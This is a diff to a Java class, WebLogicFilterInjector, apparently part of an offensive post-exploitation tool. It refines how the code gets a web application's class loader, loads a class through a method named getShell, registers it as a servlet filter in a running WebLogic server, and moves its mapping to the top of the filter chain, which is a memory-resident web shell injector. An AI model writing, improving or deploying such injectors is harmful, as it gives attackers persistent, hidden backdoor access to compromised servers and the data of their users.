@@ -116,6 +116,11 @@ public class WebLogicFilterInjector {
         return webappContexts.toArray();
     }
 
+    /**
+     * weblogic.servlet.internal.WebAppServletContext
+     * /opt/oracle/wls1036/server/lib/weblogic.jar
+     * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
+     */
     public static Object[] getContext() {
         Set<Object> webappContexts = new HashSet<Object>();
         try {
@@ -129,12 +134,17 @@ public class WebLogicFilterInjector {
         return webappContexts.toArray();
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -149,6 +159,7 @@ public class WebLogicFilterInjector {
     @SuppressWarnings("unchecked")
     public void inject(Object context, Object filter) throws Exception {
         if (isInjected(context)) {
+            System.out.println("filter already injected");
             return;
         }
         Object filterManager = invokeMethod(context, "getFilterManager", null, null);
@@ -159,6 +170,7 @@ public class WebLogicFilterInjector {
         List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
         Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
         filterPatternList.add(0, currentMapping);
+        System.out.println("filter inject successful");
     }
 
     @SuppressWarnings("all")
